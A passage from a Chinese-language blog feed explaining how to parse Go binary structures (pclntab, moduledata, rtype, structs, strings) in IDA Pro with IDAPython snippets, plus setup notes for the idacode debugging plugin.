first_moduledata_addr</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;func_tbl除了NumOfFunc，剩下就是func_addr和offset_of_funcstruct1组成的一个list，而offset_of_funcstruct只是一个指向funcstruct的一个偏移。funcstruct真正的地址是pclntable的地址加上func_struct的偏移，同理，srcfile_tbl除了NumOfScrFile，也包含一个存储srcfilename偏移的list。同样的，指向srcfilename地址也是pclntable的地址加上srcfilename的偏移。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">func_struct_addr</span> = pclntb_addr + func_struct_<span class="literal">off</span>set</div><div class="line"><span class="attr">srcfilename_addr</span> = pclntb_addr + src_filename_<span class="literal">off</span>set</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pclntab的地址是0x004CBA00，而第一个函数的funcstruct的偏移为0x387C，所以funcstruct的地址为pclntb_addr + func_struct_offset，即0x004CF27C。func_struct的结构如下.其中比较重要的是func_entry以及offset_funcname：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">typedef func_struct struct</div><div class="line">&#123;</div><div class="line">   <span class="built_in">DWORD</span> func_entry         //函数入口地址</div><div class="line">   <span class="built_in">DWORD</span> offset_funcname    //函数名称偏移</div><div class="line">   <span class="built_in">DWORD</span> args</div><div class="line">   <span class="built_in">DWORD</span> frame</div><div class="line">   <span class="built_in">DWORD</span> pcsp</div><div class="line">   <span class="built_in">DWORD</span> pcfile</div><div class="line">   <span class="built_in">DWORD</span> pcln</div><div class="line">   <span class="built_in">DWORD</span> nfuncdata</div><div class="line">   <span class="built_in">DWORD</span> npdata</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><pre><code>![mark](http://hacky.wang/blog/20210711/GPuCp5oCqaL3.png?imageslim)</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_funcname是函数名称的偏移量，和func_struct一样，addr_funcname 是通过pclntab的地址加上offset_funcname的值得来，即<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">addr_funcname</span> = addr_pclntbl + <span class="literal">off</span>set_funcname</div></pre></td></tr></table></figure></p><h2 id="0x03-Moduledata及如何定位-First-Moduledata"><a href="#0x03-Moduledata及如何定位-First-Moduledata" class="headerlink" title="0x03 Moduledata及如何定位 First_Moduledata"></a>0x03 Moduledata及如何定位 First_Moduledata</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Module 中可以包含多个不同的 Package，而每个 Package 中可以包含多个目录和很多的源码文件。Moduledata结构如下：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">type</span> moduledata <span class="keyword">struct </span>&#123;</div><div class="line">    pclntable    []<span class="keyword">byte </span>   // pclntab <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   ftab         []functab // <span class="meta">function</span> table <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   filetab      []uint32  // source file table <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   findfunctab  uintptr</div><div class="line">    minpc, maxpc uintptr   // minpc: first <span class="built_in">pc</span>(<span class="meta">function</span>) <span class="keyword">address</span></div><div class="line"><span class="keyword"></span></div><div class="line"><span class="keyword"> </span>   text, etext           uintptr  // [<span class="meta">.text</span>] section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="keyword">noptrdata, </span>enoptrdata uintptr</div><div class="line">    <span class="meta">data</span>, edata           uintptr  // [<span class="meta">.data</span>] section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="keyword">bss, </span>ebss             uintptr  // [.<span class="keyword">bss] </span>section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="keyword">noptrbss, </span>enoptrbss   uintptr  // [.<span class="keyword">noptrbss] </span>section start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"> </span>   <span class="meta">end</span>, gcdata, gcbss    uintptr</div><div class="line">    types, etypes         uintptr  // types <span class="meta">data</span> start/<span class="meta">end</span> <span class="keyword">address</span></div><div class="line"><span class="keyword"></span></div><div class="line"><span class="keyword"> </span>   textsectmap []textsect</div><div class="line">    typelinks   []int32    // offset table for types</div><div class="line">    <span class="keyword">itablinks </span>  []*<span class="keyword">itab </span>   // interface table</div><div class="line"></div><div class="line">    ptab []ptabEntry</div><div class="line"></div><div class="line">    pluginpath <span class="keyword">string</span></div><div class="line"><span class="keyword"> </span>   pkghashes  []modulehash</div><div class="line">    modulename   <span class="keyword">string</span></div><div class="line"><span class="keyword"> </span>   modulehashes []modulehash</div><div class="line">    hasmain uint8 // <span class="number">1</span> <span class="meta">if</span> module contains the main <span class="meta">function</span>, <span class="number">0</span> otherwise</div><div class="line">    gcdatamask, gcbssmask <span class="keyword">bitvector</span></div><div class="line"><span class="keyword"> </span>   typemap <span class="meta">map</span>[typeOff]*_type // offset to *_rtype in previous module</div><div class="line">    <span class="keyword">bad </span><span class="keyword">bool </span>// module failed to load <span class="keyword">and </span>should <span class="keyword">be </span>ignored</div><div class="line"></div><div class="line">    next *moduledata</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显然可以看到，moduledata之间通过链表的形式进行链接，而在Go文件中，只有firstmoduledata才拥有完整的结构,其中，比较重要的结构主要是<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">pclntable</span>    <span class="selector-attr">[]</span><span class="selector-tag">byte</span>    <span class="comment">// pclntab address</span></div><div class="line"><span class="selector-tag">ftab</span>         <span class="selector-attr">[]</span><span class="selector-tag">functab</span> <span class="comment">// function table address</span></div><div class="line"><span class="selector-tag">filetab</span>      <span class="selector-attr">[]</span><span class="selector-tag">uint32</span>  <span class="comment">// source file table address</span></div><div class="line"><span class="selector-tag">types</span>, <span class="selector-tag">etypes</span>         <span class="selector-tag">uintptr</span>  <span class="comment">// types data start/end address</span></div><div class="line"><span class="selector-tag">typelinks</span>   <span class="selector-attr">[]</span><span class="selector-tag">int32</span>    <span class="comment">// offset table for types</span></div><div class="line"><span class="selector-tag">itablinks</span>   <span class="selector-attr">[]</span>*<span class="selector-tag">itab</span>    <span class="comment">// interface table</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由此看来，针对Go逆向，首先就是需要寻找firstmoduledata，因为他包含了主要可以使用的信息，functble srcfiletble typelink等等。很显然，firstmoduledata第一个成员就是pclntable，只要定位到了pclntable就可以定位到firstmoduledata。</p><h2 id="0x04-Type介绍与解析"><a href="#0x04-Type介绍与解析" class="headerlink" title="0x04 Type介绍与解析"></a>0x04 Type介绍与解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Go存在多种数据类型，有以bool,int等为代表的Basic Type(基本数据类型)，和以array，slice等为代表的复杂数据类型。而这些数据类型都是以一个名为<code>rtype</code>为基础的结构体拓展而来。如果是一些包括bool在内的简单数据类型，rtype就可以简单概括，如果是一些复杂的数据类型，则需要在rtype的基础上进行拓展而来。<br>    <img src="http://hacky.wang/blog/20210711/90Xma6V7D6yO.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上节，在介绍firstmoduledata结构的时候，存在firstmoduledata.typelinks成员以及firstmoduledata.typenumber成员，typelinks是一个存储着type的offset的list，而type_addr是firstmoduledata.typeaddr加上这些偏移所得到的。typenumber则表征着有多少个type。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">type_addr</span> = self.first_moduledata.types_addr + type_<span class="literal">off</span>set</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210711/INGj8IHxFtz4.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210711/tBfxXYQes1Uk.png?imageslim" alt="mark"></p><h3 id="0x04-1-rtype-解析"><a href="#0x04-1-rtype-解析" class="headerlink" title="0x04-1 rtype 解析"></a>0x04-1 rtype 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rtype表征一个简单的数据结构，其他类型都是从其拓展而来。rtype结构如下：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> rtype struct &#123;</div><div class="line">    size       uintptr</div><div class="line">    ptrdata    uintptr  // number <span class="keyword">of</span> bytes <span class="keyword">in</span> the <span class="keyword">type</span> that can contain pointers</div><div class="line">    hash       <span class="built_in">uint32</span>   // hash <span class="keyword">of</span> <span class="keyword">type</span>; avoids computation <span class="keyword">in</span> hash tables</div><div class="line">    tflag      tflag    // extra <span class="keyword">type</span> information flags</div><div class="line">    align      <span class="built_in">uint8</span>    // alignment <span class="keyword">of</span> variable <span class="keyword">with</span> this <span class="keyword">type</span></div><div class="line">    fieldAlign <span class="built_in">uint8</span>    // alignment <span class="keyword">of</span> struct field <span class="keyword">with</span> this <span class="keyword">type</span></div><div class="line">    kind       <span class="built_in">uint8</span>    // enumeration <span class="keyword">for</span> C</div><div class="line">    alg        *typeAlg // algorithm table</div><div class="line">    gcdata     *byte    // garbage collection data</div><div class="line">    str        nameOff  // <span class="built_in">string</span> form</div><div class="line">    ptrToThis  typeOff  // <span class="keyword">type</span> <span class="keyword">for</span> <span class="built_in">pointer</span> to this <span class="keyword">type</span>, may be zero</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的结构如下：</p><ul><li>kind:表示变量的类型，其与KIND_MASK进行<strong>按位与</strong>操作得到的值才可以表示变量的类型，而KIND_MASK = (1 &lt;&lt; 5) - 1<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">type_kind = kind &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">5</span>) - <span class="number">1</span>)</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type_kind其实作为一个枚举类型存在,比如type_kind 为36，则表示是一个Ptr类型。<br><figure class="highlight julia"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> Kind uint</div><div class="line"><span class="keyword">const</span> (</div><div class="line">    Invalid Kind = iota</div><div class="line">    <span class="built_in">Bool</span></div><div class="line">    <span class="built_in">Int</span></div><div class="line">    <span class="built_in">Int8</span></div><div class="line">    <span class="built_in">Int16</span></div><div class="line">    <span class="built_in">Int32</span></div><div class="line">    <span class="built_in">Int64</span></div><div class="line">    Uint</div><div class="line">    Uint8</div><div class="line">    Uint16</div><div class="line">    Uint32</div><div class="line">    Uint64</div><div class="line">    Uintptr</div><div class="line">    <span class="built_in">Float32</span></div><div class="line">    <span class="built_in">Float64</span></div><div class="line">    <span class="built_in">Complex64</span></div><div class="line">    <span class="built_in">Complex128</span></div><div class="line">    <span class="built_in">Array</span></div><div class="line">    Chan</div><div class="line">    Func</div><div class="line">    Interface</div><div class="line">    Map</div><div class="line">    <span class="built_in">Ptr</span></div><div class="line">    Slice</div><div class="line">    <span class="built_in">String</span></div><div class="line">    Struct</div><div class="line">    UnsafePointer</div><div class="line">)</div></pre></td></tr></table></figure></p><ul><li>str：表示指向变量名的offset:offset加上typeaddr的地址就是typename的地址</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">name_addr</span> = type_addr+name_<span class="literal">off</span>set</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 值得注意的是，type name并不是一个单纯的string类型，而是是一个type_name 结构体<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">typedef type_name struct</div><div class="line">&#123;</div><div class="line">   <span class="built_in">flag</span>: <span class="comment">//是否可以导出,带有tag或者pkgpath</span></div><div class="line">   length  <span class="comment">//name长度</span></div><div class="line">   <span class="built_in">name</span>    <span class="comment">//string类型</span></div><div class="line">&#125;</div><div class="line">如果<span class="built_in">flag</span> &amp; <span class="built_in">Name</span>.MASK_EXPORTED ！=<span class="number">0</span> 说明可以被导出</div><div class="line">如果<span class="built_in">flag</span> &amp; <span class="built_in">Name</span>.MASK_FOLLOWED_BY_TAG !=<span class="number">0</span>，说明带有tag</div><div class="line">如果<span class="built_in">flag</span> &amp; <span class="built_in">Name</span>.MASK_FOLLOWED_BY_PKGPATH，说明带有pkgpath</div></pre></td></tr></table></figure></p><h3 id="0x04-2-Ptr-解析"><a href="#0x04-2-Ptr-解析" class="headerlink" title="0x04-2 Ptr 解析"></a>0x04-2 Ptr 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为rtype.kind表征着type的类型，所以，在解析完rtype，判断一下kind，然后在去解析对应的复杂变量结构体即可。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># <span class="type">Ptr</span> <span class="type">Type</span></div><div class="line"><span class="title">if</span> <span class="type">RType</span>.<span class="type">TYPE_KINDS</span>[r<span class="keyword">type</span>.kind &amp; <span class="type">RType</span>.<span class="type">KIND_MASK</span>] == "<span class="type">Ptr</span>":</div><div class="line">    ptr<span class="keyword">type</span> = <span class="type">PtrType</span>(rtype.addr+0x20,rtype)</div><div class="line">    ptr<span class="keyword">type</span>.parse()</div><div class="line">    <span class="keyword">if</span> ptr<span class="keyword">type</span>.stringtype_addr != 0:</div><div class="line">        self.stringtype_addr = ptrtype.stringtype_addr</div><div class="line">        </div><div class="line"></div><div class="line"># <span class="type">Struct</span> <span class="type">Type</span></div><div class="line"><span class="title">if</span> <span class="type">RType</span>.<span class="type">TYPE_KINDS</span>[r<span class="keyword">type</span>.kind &amp; <span class="type">RType</span>.<span class="type">KIND_MASK</span>] == "<span class="type">Struct</span>":</div><div class="line">    struct<span class="keyword">type</span> = <span class="type">StructType</span>(rtype)</div><div class="line">    struct<span class="keyword">type</span>.parse()</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之前说过复杂数据类型都是从rtype拓展而来，ptrType结构如下，所以当解析到kind为Ptr的时候，读取当前rtype+0x20处的数据，进行解析就是下一个rtype【图7】<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> <span class="title">ptrType</span></span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    rtype</div><div class="line">    elem *rtype <span class="comment">// pointer element (pointed at) type</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># <span class="type">Ptr</span> <span class="type">Type</span></div><div class="line"><span class="title">if</span> <span class="type">RType</span>.<span class="type">TYPE_KINDS</span>[r<span class="keyword">type</span>.kind &amp; <span class="type">RType</span>.<span class="type">KIND_MASK</span>] == "<span class="type">Ptr</span>":</div><div class="line">    ptr<span class="keyword">type</span> = <span class="type">PtrType</span>(rtype.addr+0x20,rtype)</div><div class="line">    ptr<span class="keyword">type</span>.parse()</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210711/JF2kARJlfI5a.png?imageslim" alt="mark"></p><h3 id="0x04-3-Struct-解析"><a href="#0x04-3-Struct-解析" class="headerlink" title="0x04-3 Struct 解析"></a>0x04-3 Struct 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;structType如下，只需要依次解析位于偏移0x20的pkgPath和偏移位于0x24的fields两个成员即可。<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> <span class="title">structType</span></span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    rtype</div><div class="line">    pkgPath name          <span class="comment">// !! pointer</span></div><div class="line">    fields  []structField <span class="comment">// sorted by offset</span></div><div class="line">&#125;</div><div class="line"><span class="comment">////////////////////////////////</span></div><div class="line">    def __init__(<span class="keyword">self</span>,rtype):</div><div class="line">        <span class="keyword">self</span>.rtype_pkgpath_addr = rtype.addr+<span class="number">0x20</span></div><div class="line">        <span class="keyword">self</span>.pkgpath_addr = <span class="number">0</span></div><div class="line">        <span class="keyword">self</span>.pkgpath = <span class="string">""</span></div><div class="line">        <span class="keyword">self</span>.rtype_structField_addr = rtype.addr+<span class="number">0x24</span></div><div class="line">        <span class="keyword">self</span>.structField_addr = <span class="number">0</span></div><div class="line">        <span class="keyword">self</span>.rtype = rtype</div><div class="line"></div><div class="line">    def parse(<span class="keyword">self</span>):</div><div class="line">        common._info(<span class="string">"\t\t\t  Struct:%s start\t\t\t  "</span> % <span class="keyword">self</span>.rtype.Name.name_str)</div><div class="line">        <span class="keyword">self</span>.parse_pkgpath()</div><div class="line">        idc.MakeComm(<span class="keyword">self</span>.rtype_pkgpath_addr,<span class="string">"rtype.pkgpath @0x%x"</span> % <span class="keyword">self</span>.pkgpath_addr)</div><div class="line"></div><div class="line">        <span class="keyword">self</span>.parse_fields()</div><div class="line">        idc.MakeComm(<span class="keyword">self</span>.rtype_structField_addr,<span class="string">"rtype.structField @0x%x"</span> % <span class="keyword">self</span>.structField_addr)</div><div class="line">        common._info(<span class="string">"\t\t\t  Struct:%s end\t\t\t  "</span> % <span class="keyword">self</span>.rtype.Name.name_str)</div></pre></td></tr></table></figure></p><h2 id="0x05-String类型遍历和解析"><a href="#0x05-String类型遍历和解析" class="headerlink" title="0x05 String类型遍历和解析"></a>0x05 String类型遍历和解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String暂时只解析常量string和字符串变量。</p><h3 id="0x05-1-const-string-解析"><a href="#0x05-1-const-string-解析" class="headerlink" title="0x05-1 const string 解析"></a>0x05-1 const string 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const 主要是通过代码匹配实现的。如下所示,const string 在进行使用的时候，都会将字符串长度传入栈中，只需要暴力匹配即可。另外go_parser的这部分是从 golang_loader_assist 移植而来，但是缺少了一个寄存器，导致部分string匹配不上。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>0048D16D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, aHelloWorld2 <span class="comment">; "hello,World2!"</span></div><div class="line"><span class="symbol">.text:</span>0048D173                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">50h</span>+var_50], <span class="built_in">eax</span></div><div class="line"><span class="symbol">.text:</span>0048D176                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">50h</span>+var_4C], <span class="number">0Dh</span></div><div class="line"><span class="symbol">.text:</span>0048D17E                 <span class="keyword">call</span>    runtime_convTstring</div></pre></td></tr></table></figure></p><h3 id="0x05-1-ptr-string-解析"><a href="#0x05-1-ptr-string-解析" class="headerlink" title="0x05-1 ptr string 解析"></a>0x05-1 ptr string 解析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;go_parser关于ptr 解析好像也是暴力匹配，但是J!4Yu师傅提出利用string交叉引用来解析ptrstring的方法。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">另外一个可以考虑的思路，是遍历上面提到的 <span class="built_in">string</span> 类型定义的交叉引用，然后看看有没有如上的汇编指令片段的 Pattern。如果一段汇编代码中拿 <span class="built_in">string</span> 类型定义去解析一个字符串，那么就可以顺藤摸瓜找到字符串指针，字符串指针的地址后面紧挨着就是字符串的长度，这样也可以把字符串解析出来。感兴趣的师傅可以验证一下。</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在解析type的时候暂时存了stringtype_addr的地址，然后进行交叉引用，找到所有的引用。然后判断下面四个条件即可：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">idc.print_insn_mnem(<span class="keyword">addr</span>) ==<span class="string">"lea"</span></div><div class="line">idc.<span class="type">GetOpnd</span>(<span class="keyword">addr</span>, <span class="number">0</span>) <span class="keyword">in</span> <span class="type">StringParse</span>.<span class="type">VALID_REGS</span> </div><div class="line">idc.<span class="type">GetOpnd</span>(<span class="keyword">addr</span>, <span class="number">0</span>) == idc.<span class="type">GetOpnd</span>(idc.<span class="type">FindCode</span>(<span class="keyword">addr</span>, idaapi.<span class="type">SEARCH_DOWN</span>), <span class="number">1</span>)</div><div class="line">'off_' <span class="keyword">in</span> idc.<span class="type">GetOpnd</span>(idc.<span class="type">FindCode</span>(idc.<span class="type">FindCode</span>(<span class="keyword">addr</span>,idaapi.<span class="type">SEARCH_DOWN</span>),idaapi.<span class="type">SEARCH_DOWN</span>), <span class="number">1</span>):</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为name为string的其实有很多，或者kind为String的其实也有很多，所以当确定name带有String，且kind为string时，便是符合条件的type结构体。【图9】<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> name<span class="selector-class">.name_str</span> == <span class="string">"*string"</span> and RType<span class="selector-class">.TYPE_KINDS</span>[self<span class="selector-class">.kind</span> &amp; RType.KIND_MASK] ==<span class="string">"String"</span>:</div><div class="line">     self<span class="selector-class">.stringtype_addr</span> = self.addr</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>    <img src="http://hacky.wang/blog/20210711/GdlNogpBeuhl.png?imageslim" alt="mark"></p><p>Ref:<a href="https://www.anquanke.com/member/122079" target="_blank" rel="external">https://www.anquanke.com/member/122079</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-idapython-调试&quot;&gt;&lt;a href=&quot;#0x00-idapython-调试&quot; class=&quot;headerlink&quot; title=&quot;0x00 idapython 调试&quot;&gt;&lt;/a&gt;0x00 idapython 调试&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;配置好IDA 7.5 免安装版之后，可以正常使用idapython，但是在import idc会报错。修改&lt;code&gt;%IDA_7.5%\python\3\ida_idaapi.py&lt;/code&gt;文件，在第80行，添加如下：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sys&lt;span class=&quot;selector-class&quot;&gt;.modules&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;]&lt;span class=&quot;selector-class&quot;&gt;.IDAPYTHON_COMPAT_695_API&lt;/span&gt; = True&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;http://hacky.wang/blog/20210711/opAdW5ctvdze.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在vscode添加插件idacode&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/oAt11UWv7kxW.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在IDA pro 安装插件，在&lt;a href=&quot;https://github.com/ioncodes/idacode/releases&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ioncodes/idacode/releases&lt;/a&gt;处下载。解压到%IDAPATH%/plugins中。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;编辑 &lt;code&gt;idacode_utils/settings.py&lt;/code&gt;，把 Python 的可执行文件路径改为自己电脑上 Python 的路径&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/yo6yEXmAtGx2.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;重新打开，在输出窗口就能看到是否成功，可能会提示缺少模块，可以通过Pip安装模块debugpy&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/e6bruJAYtJnm.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 安装成功就是这样的。&lt;br&gt;    &lt;img src=&quot;http://hacky.wang/blog/20210711/vIx9aM2Dq8tL.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Golang Reverse" scheme="https://findream.github.io/categories/Golang-Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>C# 反射注入总结</title>
    <link href="https://findream.github.io/2021/07/12/C#%E5%8F%8D%E5%B0%84%E6%80%BB%E7%BB%93/"/>
    <id>https://findream.github.io/2021/07/12/C#反射总结/</id>
    <published>2021-07-12T12:45:11.000Z</published>
    <updated>2021-11-07T09:18:00.193Z</updated>
    
